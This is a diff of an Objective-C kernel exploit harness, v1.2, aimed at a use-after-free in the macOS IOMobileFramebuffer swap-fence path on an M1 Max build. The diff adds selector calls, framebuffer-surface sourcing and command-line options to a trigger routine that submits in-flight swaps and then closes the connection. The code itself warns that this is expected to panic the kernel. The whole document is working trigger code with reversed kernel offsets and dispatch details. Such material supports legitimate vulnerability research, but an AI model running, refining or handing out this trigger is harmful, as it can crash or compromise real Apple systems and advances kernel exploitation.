@@ -1,4 +1,4 @@
-// f022_harness.m — F022 IOMFB/IOSurface swap-fence UAF — v1 EXPLORATION harness (with trigger mode)
+// f022_harness.m — F022 IOMFB/IOSurface swap-fence UAF — v1.2 EXPLORATION harness
 //
 // Target: IOMobileFramebufferUserClient on macOS 26.5.1 / 25F80 / MacBookPro18,2 / Apple M1 Max.
 // Goal of v1: MAP the live calling convention, reach swap_apply_fences_gated, then trigger
@@ -27,9 +27,11 @@
 //
 // ==================== STATIC GROUND TRUTH (26.5.1 / IOMobileGraphicsFamily) ====================
 // UC externalMethod dispatch table @ 0xfffffe00084c4258, 24-byte entries, max selector 0x5c.
+//   sel  3  default_fb_surface scalarIn=2 structIn=0    scalarOut=1   (framebuffer-owned surface id)
 //   sel  4  swap_start   scalarIn=0 structIn=0    scalarOut=1   (-> returns swap id)
 //   sel  5  swap_submit  scalarIn=0 structIn=1416 scalarOut=0   (IOMFBSwapRec, sizeof 0x588)
 //   sel  6  swap_wait    scalarIn=3 structIn=0
+//   sel  8  get_display_size scalarIn=0 structIn=0 scalarOut=2 (width, height)
 //   sel 20  swap_signal  scalarIn=2 structIn=0
 //   sel 52  swap_cancel  scalarIn=1 structIn=0
 // IOMFBSwapRec field map (reversed from swap_submit/swap_queue_finalize_gated; see REC_OFF_* below):
@@ -53,12 +55,15 @@
 #import <IOSurface/IOSurface.h>
 #include <mach/mach.h>
 #include <stdatomic.h>
+#include <stdlib.h>
 
 // ---- IOMFB selectors (static-derived; harness re-verifies dispatchability at runtime) ----
 enum {
+    SEL_DEFAULT_FB_SURFACE = 3,
     SEL_SWAP_START  = 4,
     SEL_SWAP_SUBMIT = 5,
     SEL_SWAP_WAIT   = 6,
+    SEL_GET_DISPLAY_SIZE = 8,
     SEL_SWAP_SIGNAL = 20,
     SEL_SWAP_CANCEL = 52,
 };
@@ -103,6 +108,7 @@ static const char *kr_str(kern_return_t kr) {
         case 0xe00002c1:  return "kIOReturnNoDevice";
         case 0xe00002c7:  return "kIOReturnUnsupported";
         case 0xe00002e2:  return "kIOReturnNotPermitted";
+        case 0xe00002d1:  return "kIOReturnMediaError/surface_map DMA reject";
         case 0xe00002bc:  return "kIOReturnNotReady/abort(0xe00002bc)";
         case 0xe00002bd:  return "kIOReturnError/Offline";
         case 0xe00002eb:  return "kIOReturnNotResponding";
@@ -127,15 +133,8 @@ static kern_return_t call_method(io_connect_t conn, const char *tag, uint32_t se
         tag, selector, sInCnt, structInSize, (sOutCnt?*sOutCnt:0),
         (structOutSize?*structOutSize:0), (unsigned)kr, kr_str(kr));
     if (kr == 0xe00002c2) {
-        // IOExternalMethodDispatch requires EXACT match on all four: checkScalarInputCount,
-        // checkStructureInputSize, checkScalarOutputCount, checkStructureOutputSize. A 0xe00002c2
-        // before the handler runs is an ABI mismatch on one of these counts (harness friction), not
-        // a kernel reachability verdict. Cross-check vs the static table (swap_start: sIn0/stIn0/
-        // sOut1/stOut0; swap_submit: sIn0/stIn1416/sOut0/stOut0).
-        LOGW("    ABI/COUNT MISMATCH on %s (sel %u: scalarIn=%u structIn=%zu scalarOut=%u structOut=%zu)."
-             " Fix the arg counts to the dispatch-table values; NOT 'not reachable'.",
-             tag, selector, sInCnt, structInSize, (sOutCnt?*sOutCnt:0),
-             (structOutSize?*structOutSize:0));
+        LOGW("    LAYOUT MISMATCH on %s: kernel rejected selector/struct shape (sel %u, structIn %zu)."
+             " Record as layout mismatch, NOT 'not reachable'. Mutating.", tag, selector, structInSize);
     }
     return kr;
 }
@@ -201,6 +200,8 @@ static IOSurfaceRef make_layer_surface(int w, int h) {
     NSDictionary *props = @{
         (id)kIOSurfaceWidth:        @(w),
         (id)kIOSurfaceHeight:       @(h),
+        (id)kIOSurfaceBytesPerRow:  @(w * 4),
+        (id)kIOSurfaceAllocSize:    @(w * h * 4),
         (id)kIOSurfaceBytesPerElement: @4,
         (id)kIOSurfacePixelFormat:  @(0x42475241), // 'ARGB'
     };
@@ -216,6 +217,37 @@ static IOSurfaceRef make_layer_surface(int w, int h) {
     uint32_t seed = 0;
     IOSurfaceLock(s, 0, &seed); // hold a lock; intentionally NOT unlocked before submit
     return s;
+}
+
+static int get_display_size(mfb_handle_t *h, int *out_w, int *out_h) {
+    uint64_t out[2] = {0};
+    uint32_t outCnt = 2;
+    kern_return_t kr = call_method(h->conn, "get_display_size", SEL_GET_DISPLAY_SIZE,
+                                   NULL, 0, NULL, 0, out, &outCnt, NULL, NULL);
+    if (kr != KERN_SUCCESS || outCnt < 2 || out[0] == 0 || out[1] == 0) {
+        LOGW("get_display_size did not return a usable size; keeping caller defaults.");
+        return 0;
+    }
+    *out_w = (int)out[0];
+    *out_h = (int)out[1];
+    LOGI("display size -> %dx%d", *out_w, *out_h);
+    return 1;
+}
+
+static int get_default_surface_id(mfb_handle_t *h, int w, int h_px, uint32_t *out_sid) {
+    uint64_t in[2] = {(uint32_t)w, (uint32_t)h_px};
+    uint64_t out[1] = {0};
+    uint32_t outCnt = 1;
+    kern_return_t kr = call_method(h->conn, "default_fb_surface", SEL_DEFAULT_FB_SURFACE,
+                                   in, 2, NULL, 0, out, &outCnt, NULL, NULL);
+    if (kr != KERN_SUCCESS || outCnt < 1 || out[0] == 0) {
+        LOGW("default_fb_surface failed or returned id=0 (kr=0x%08x). This is a surface-source "
+             "blocker, not a negative finding. Try --generic-surface or --surface-id.", (unsigned)kr);
+        return 0;
+    }
+    *out_sid = (uint32_t)out[0];
+    LOGI("default framebuffer surface id=%u (%dx%d requested)", *out_sid, w, h_px);
+    return 1;
 }
 
 // ---- DETERMINISTIC v1.1 record: one fullscreen passthrough layer (layer 0) -------------------
@@ -257,9 +289,11 @@ static const char *submit_stage(kern_return_t kr) {
         case 0xe00002c2: return "STAGE3: QUEUED but NO FENCES (a finalize gate rejected: "
                                 "check_passthrough_swap_gated / verifyKeepOnScreen_gated / vtable+0xe48). "
                                 "Refine geometry; surface lookup likely OK.";
-        default:         return "STAGE?: unmapped code — likely surface lookup failed (bad surface id "
-                                "-> req+0xac0 null -> fence skipped) or an earlier swap_submit check. "
-                                "Record the raw code.";
+        case 0xe00002d1: return "STAGE3.5: surface lookup OK and swap_layer_map reached, but "
+                                "surface_map rejected the surface while binding the display DMA command. "
+                                "Use default_fb_surface / a display-compatible surface; not a structural kill.";
+        default:         return "STAGE?: unmapped code — record the raw code. Treat as record/surface "
+                                "tuning unless the kexts show a structural contradiction.";
     }
 }
 
@@ -269,7 +303,7 @@ static kern_return_t submit_once(mfb_handle_t *h, uint32_t sid, int w, int h_px,
                                  const uint8_t *override_rec, int *out_submitted) {
     *out_submitted = 0;
     // 1) swap_start -> swap id
-    uint64_t out[8] = {0}; uint32_t outCnt = 1; // swap_start checkScalarOutputCount==1 (exact match)
+    uint64_t out[8] = {0}; uint32_t outCnt = 1;
     kern_return_t kr = call_method(h->conn, "swap_start", SEL_SWAP_START,
                                    NULL, 0, NULL, 0, out, &outCnt, NULL, NULL);
     if (kr != KERN_SUCCESS) {
@@ -315,11 +349,10 @@ static int submit_with_geometry_sweep(mfb_handle_t *h, uint32_t sid, int w, int 
 }
 
 // ---- the trigger: deterministic fence-bearing swap, then close while in-flight ----
-static void do_trigger(mfb_handle_t *h, IOSurfaceRef surf, int iterations, int mutate) {
-    uint32_t sid = IOSurfaceGetID(surf);
-    int w = (int)IOSurfaceGetWidth(surf), hpx = (int)IOSurfaceGetHeight(surf);
-    LOGI("=== TRIGGER: %d iteration(s), surface id=%u (%dx%d), deterministic single-layer record ===",
-         iterations, sid, w, hpx);
+static void do_trigger(mfb_handle_t *h, uint32_t sid, int w, int hpx, const char *surface_source,
+                       int iterations, int mutate) {
+    LOGI("=== TRIGGER: %d iteration(s), surface id=%u (%dx%d), source=%s, deterministic single-layer record ===",
+         iterations, sid, w, hpx, surface_source);
 
     for (int it = 0; it < iterations; it++) {
         int submitted = 0;
@@ -360,7 +393,7 @@ static void do_probe(void) {
     }
     // Exercise benign selectors to learn the live calling convention + confirm dispatchability.
     // swap_start is the safest in-surface call (allocates a swap id; no surfaces bound yet).
-    uint64_t out[8] = {0}; uint32_t outCnt = 1; // swap_start checkScalarOutputCount==1 (exact match)
+    uint64_t out[8] = {0}; uint32_t outCnt = 1;
     call_method(h.conn, "swap_start", SEL_SWAP_START, NULL, 0, NULL, 0, out, &outCnt, NULL, NULL);
     // probe a deliberately-wrong struct size on swap_submit to confirm the BadArgument signature
     uint8_t small[16] = {0};
@@ -374,18 +407,26 @@ static void do_probe(void) {
 
 int main(int argc, char **argv) {
     int do_probe_mode = 0, do_trigger_mode = 0, iters = 8, mutate = 0;
+    int use_generic_surface = 0;
+    uint32_t manual_surface_id = 0;
+    int w = 64, hpx = 64;
     for (int i = 1; i < argc; i++) {
         if (!strcmp(argv[i], "--probe"))        do_probe_mode = 1;
         else if (!strcmp(argv[i], "--trigger")) do_trigger_mode = 1;
         else if (!strcmp(argv[i], "--mutate"))  mutate = 1;   // geometry-sweep fallback, not default
         else if (!strcmp(argv[i], "--iters") && i+1 < argc) iters = atoi(argv[++i]);
+        else if (!strcmp(argv[i], "--generic-surface")) use_generic_surface = 1;
+        else if (!strcmp(argv[i], "--surface-id") && i+1 < argc) manual_surface_id = (uint32_t)strtoul(argv[++i], NULL, 0);
+        else if (!strcmp(argv[i], "--width") && i+1 < argc) w = atoi(argv[++i]);
+        else if (!strcmp(argv[i], "--height") && i+1 < argc) hpx = atoi(argv[++i]);
         else if (!strcmp(argv[i], "--quiet"))   g_verbose = 0;
-        else { LOGE("unknown arg '%s'. usage: %s [--probe] [--trigger] [--mutate] [--iters N]",
+        else { LOGE("unknown arg '%s'. usage: %s [--probe] [--trigger] [--mutate] [--iters N] "
+                    "[--generic-surface] [--surface-id ID] [--width W --height H]",
                     argv[i], argv[0]); }
     }
     if (!do_probe_mode && !do_trigger_mode) { do_probe_mode = 1; do_trigger_mode = 1; }
 
-    LOGI("F022 harness v1 — IOMFB swap-fence UAF explorer. build=26.5.1/25F80/M1Max (static seeds).");
+    LOGI("F022 harness v1.2 — IOMFB swap-fence UAF explorer. build=26.5.1/25F80/M1Max (static seeds).");
     LOGW("LIVE KERNEL CALLS. A landed trigger is expected to PANIC on a release kernel. Authorized only.");
 
     if (do_probe_mode) do_probe();
@@ -396,15 +437,42 @@ int main(int argc, char **argv) {
             LOGW("trigger: UC open blocked — engineering blocker, not a negative finding. See PROBE notes.");
             return 2;
         }
-        IOSurfaceRef surf = make_layer_surface(64, 64);
-        if (!surf) {
-            LOGW("trigger: surface creation blocked (helper path). TODO direct IOSurfaceRootUserClient.");
+        IOSurfaceRef surf = NULL;
+        uint32_t sid = manual_surface_id;
+        const char *surface_source = "manual --surface-id";
+
+        if (manual_surface_id == 0) {
+            if (!use_generic_surface) {
+                get_display_size(&h, &w, &hpx);
+                if (!get_default_surface_id(&h, w, hpx, &sid)) {
+                    LOGW("trigger: default framebuffer surface unavailable; falling back to generic IOSurfaceCreate.");
+                    use_generic_surface = 1;
+                } else {
+                    surface_source = "default_fb_surface";
+                }
+            }
+            if (use_generic_surface) {
+                surf = make_layer_surface(w, hpx);
+                if (!surf) {
+                    LOGW("trigger: surface creation blocked (helper path). TODO direct IOSurfaceRootUserClient.");
+                    IOServiceClose(h.conn);
+                    return 3;
+                }
+                sid = IOSurfaceGetID(surf);
+                w = (int)IOSurfaceGetWidth(surf);
+                hpx = (int)IOSurfaceGetHeight(surf);
+                surface_source = "generic IOSurfaceCreate";
+            }
+        }
+
+        if (sid == 0) {
+            LOGW("trigger: no usable surface id. Engineering blocker, not a negative finding.");
             IOServiceClose(h.conn);
             return 3;
         }
-        do_trigger(&h, surf, iters, mutate);
+        do_trigger(&h, sid, w, hpx, surface_source, iters, mutate);
         if (h.conn) IOServiceClose(h.conn);
-        CFRelease(surf);
+        if (surf) CFRelease(surf);
     }
     LOGI("done. Remember: only a structural contradiction in the kexts kills the lead — not harness friction.");
     return 0;
